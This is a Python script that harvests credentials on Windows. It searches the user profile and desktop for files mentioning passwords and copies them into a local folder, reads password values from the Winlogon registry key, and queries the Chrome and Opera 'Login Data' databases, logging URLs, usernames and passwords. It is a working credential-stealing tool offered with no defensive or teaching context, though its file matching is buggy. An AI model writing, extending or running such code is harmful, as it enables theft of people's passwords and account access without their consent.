import os
import sqlite3
import winreg
import shutil
import colorlog
from contextlib import closing

# Configure colorlog
logger = colorlog.getLogger()
logger.setLevel(colorlog.INFO)  # Set the log level
handler = colorlog.StreamHandler()
formatter = colorlog.ColoredFormatter(
    "%(log_color)s%(levelname)-8s%(reset)s %(blue)s%(message)s",
    datefmt=None,
    reset=True,
    log_colors={
        'DEBUG': 'cyan',
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'red,bg_white',
    }
)
handler.setFormatter(formatter)
logger.addHandler(handler)


def copy_file(src_path, dest_dir):
    try:
        src_path = str(src_path)
        dest_dir = str(dest_dir)
        if not os.path.exists(dest_dir):
            os.makedirs(dest_dir)
        dest_path = os.path.join(dest_dir, os.path.basename(src_path))
        shutil.copy2(src_path, dest_path)
        logger.info(f"Copied file to: {dest_path}")
    except Exception as e:
        logger.error(f"Error copying file: {e}")


def search_filesystem():
    logger.info("Searching the file system for passwords...")
    extensions = ['*.xml', '*.ini', '*.txt']
    for root, dirs, files in os.walk(os.environ['USERPROFILE']):
        for file in files:
            if any(extension in file for extension in extensions):
                file_path = os.path.join(root, file)
                if 'password' in file_path.lower() or 'password' in open(file_path).read().lower():
                    logger.info(f"Found password in file: {file_path}")
                    copy_file(file_path, "DATA/found_passwords")


def search_desktop():
    logger.info("Searching the desktop for password files...")
    desktop_path = os.path.join(os.environ['USERPROFILE'], "Desktop")
    for file in os.listdir(desktop_path):
        if "password" in file.lower():
            file_path = os.path.join(desktop_path, file)
            logger.info(f"Found password file on desktop: {file_path}")
            copy_file(file_path, "DATA/found_passwords")


def search_registry():
    logger.info("Searching the registry for passwords...")
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon")
        i = 0
        while True:
            try:
                value = winreg.EnumValue(key, i)
                if "password" in value[0].lower():
                    logger.info(f"Found password in registry: {value[0]} = {value[1]}")
                i += 1
            except OSError:
                break
    except OSError:
        logger.warning("Registry search failed.")


def search_browser(browser_name, login_data_path):
    if not os.path.exists(login_data_path):
        logger.warning(
            f"{browser_name} Login Data file not found. Is {browser_name} installed and the 'Encrypt passwords' feature disabled?")
        return

    try:
        with closing(sqlite3.connect(login_data_path)) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            results = cursor.fetchall()

            if results:
                for result in results:
                    logger.info(
                        f"Found password in {browser_name}: URL = {result[0]}, Username = {result[1]}, Password = {result[2]}")
            else:
                logger.warning(f"No passwords found in {browser_name}.")
    except sqlite3.Error as e:
        logger.error(f"Error accessing {browser_name} Login Data: {e}")


def main():
    search_registry()
    search_filesystem()
    search_desktop()
    search_browser("Google Chrome",
                   os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data",
                                "Default", "Login Data"))
    search_browser("Opera",
                   os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Opera Software", "Opera Stable",
                                "Login Data"))


if __name__ == "__main__":
    main()
